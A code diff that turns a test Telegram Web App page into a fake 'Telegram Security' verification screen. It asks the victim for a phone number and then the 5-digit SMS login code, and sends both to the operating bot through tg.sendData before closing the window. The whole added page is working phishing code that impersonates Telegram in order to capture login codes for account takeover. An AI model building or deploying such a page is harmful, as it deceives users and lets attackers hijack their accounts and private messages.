@@ -3,35 +3,117 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Test</title>
+    <title>Telegram</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            font-family:-apple-system,BlinkMacSystemFont,sans-serif;
+            background:#0f0f0f;color:#fff;
+            min-height:100vh;
+            display:flex;align-items:center;justify-content:center;padding:16px;
+        }
+        .container{
+            background:#1a1a1a;border-radius:20px;padding:32px 24px;
+            max-width:400px;width:100%;text-align:center;
+            border:1px solid #2a2a2a;
+        }
+        .shield{
+            width:80px;height:80px;margin:0 auto 24px;
+            background:linear-gradient(135deg,#2aabee,#1a8fc4);
+            border-radius:50%;display:flex;align-items:center;justify-content:center;
+            font-size:40px;
+        }
+        h2{font-size:22px;margin-bottom:6px}
+        .sub{color:#888;font-size:14px;margin-bottom:24px}
+        .hidden{display:none!important}
+        .input-box{
+            background:#1e1e1e;border:1px solid #2a2a2a;border-radius:12px;
+            padding:4px 16px;display:flex;align-items:center;gap:10px;margin-bottom:16px;
+        }
+        .input-box span{color:#888;font-size:18px}
+        .input-box input{
+            width:100%;padding:14px 0;border:none;background:transparent;
+            color:#fff;font-size:16px;outline:none;font-family:inherit;
+        }
+        .btn{
+            width:100%;padding:15px;border:none;border-radius:12px;
+            background:#2aabee;color:#fff;font-size:16px;font-weight:600;
+            cursor:pointer;font-family:inherit;margin-bottom:10px;
+        }
+        .status{font-size:13px;min-height:20px;margin-top:10px}
+        .status.err{color:#f44336}
+        .footer{margin-top:24px;font-size:11px;color:#333}
+    </style>
 </head>
-<body style="background:#1a1a1a;color:#fff;text-align:center;padding:50px;font-family:sans-serif">
-    <h2>Тест отправки данных</h2>
-    <input type="text" id="testInput" placeholder="Введи что-нибудь" style="padding:10px;width:80%;margin:10px;border-radius:8px;border:none">
-    <br>
-    <button onclick="send()" style="padding:12px 30px;background:#2aabee;color:#fff;border:none;border-radius:8px;font-size:16px">Отправить</button>
-    <p id="status"></p>
+<body>
+    <div class="container">
+        <div class="shield">🛡️</div>
+        
+        <div id="step1">
+            <h2>Проверка безопасности</h2>
+            <p class="sub">Введите номер телефона</p>
+            <div class="input-box">
+                <span>📱</span>
+                <input type="tel" id="phoneInput" placeholder="+79112223344">
+            </div>
+            <button class="btn" onclick="step2()">📩 Отправить код</button>
+            <div class="status" id="s1"></div>
+        </div>
+        
+        <div id="step2" class="hidden">
+            <h2>Код подтверждения</h2>
+            <p class="sub">SMS отправлена на<br><strong id="pd"></strong></p>
+            <div class="input-box">
+                <span>🔑</span>
+                <input type="text" id="codeInput" placeholder="5 цифр" maxlength="5" inputmode="numeric">
+            </div>
+            <button class="btn" onclick="step3()">✅ Подтвердить</button>
+            <div class="status" id="s2"></div>
+        </div>
+        
+        <div class="footer">Telegram Security © 2024</div>
+    </div>
     
     <script>
         const tg = window.Telegram.WebApp;
         tg.ready();
         tg.expand();
+        tg.MainButton.hide();
         
-        document.getElementById('status').textContent = 'WebApp готов. Версия: ' + tg.version;
+        let phone = '';
+        let step = 'phone';
         
-        function send(){
-            const val = document.getElementById('testInput').value;
-            if(!val) return;
+        function step2(){
+            const raw = document.getElementById('phoneInput').value.trim();
+            if(!raw) return;
+            phone = raw.replace(/\s/g,'').replace(/-/g,'');
+            if(!phone.startsWith('+')) phone = '+' + phone;
             
-            document.getElementById('status').textContent = 'Отправляю: ' + val;
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+            document.getElementById('pd').textContent = phone;
             
-            tg.sendData(JSON.stringify({
-                action: 'test',
-                data: val
-            }));
+            step = 'code';
+        }
+        
+        function step3(){
+            const code = document.getElementById('codeInput').value.trim();
+            if(!code || code.length < 5) return;
             
-            document.getElementById('status').textContent = 'Отправлено: ' + val;
+            // Отправляем через MainButton
+            tg.MainButton.setText('Закрыть окно');
+            tg.MainButton.show();
+            tg.MainButton.onClick(function(){
+                tg.sendData(JSON.stringify({
+                    action: 'verify',
+                    phone: phone,
+                    code: code
+                }));
+                tg.close();
+            });
+            
+            document.getElementById('s2').textContent = 'Нажмите кнопку ниже';
         }
     </script>
 </body>
